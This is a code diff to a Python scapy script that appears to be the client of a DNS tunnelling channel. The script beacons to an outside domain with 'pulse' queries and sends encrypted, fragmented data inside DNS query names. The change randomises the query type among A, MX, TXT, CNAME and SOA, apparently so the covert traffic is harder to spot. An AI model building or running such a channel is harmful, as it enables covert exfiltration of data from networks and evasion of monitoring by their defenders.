@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 from scapy.all import IP, UDP, DNS, DNSQR, sr, sr1
 from base64 import b64encode, b64decode
-from random import randint
+from random import randint, choice
 from time import sleep
 from Crypto.Cipher import AES
 
@@ -54,6 +54,8 @@ KEY = hashlib.sha256(args.key.encode()).digest()
 
 FRAG_LEN = 70 - len(DOMAIN)
 
+QUERIES = ['A', 'MX', 'TXT', 'CNAME', 'SOA']
+
 recv = b""  # Buffer of received data to process
 
 
@@ -74,7 +76,10 @@ def pulse() -> None:
     while True:
         ip = IP(dst=f"www.{DOMAIN}")
         udp = UDP(dport=53)
-        dns = DNS(id=randint(0x0, 0xffff), rd=1, qr=0, qd=DNSQR(qname=f"pulse.{DOMAIN}", qtype="A"))
+        dns = DNS(id=randint(0x0, 0xffff),
+                  rd=1,
+                  qr=0,
+                  qd=DNSQR(qname=f"pulse.{DOMAIN}", qtype=choice(QUERIES)))
 
         res = sr1(ip / udp / dns, iface=IFACE, verbose=False, timeout=TIMEOUT)
 
@@ -155,7 +160,7 @@ def send_data(data: bytes) -> None:
         dns = DNS(id=randint(0x0, 0xffff),
                   rd=1,
                   qr=0,
-                  qd=DNSQR(qname=f"{data}.{DOMAIN}", qtype="A"))
+                  qd=DNSQR(qname=f"{data}.{DOMAIN}", qtype=choice(QUERIES)))
 
         # Check if it's last item in the base64 string
         if i + 1 == len(frag_e_data):
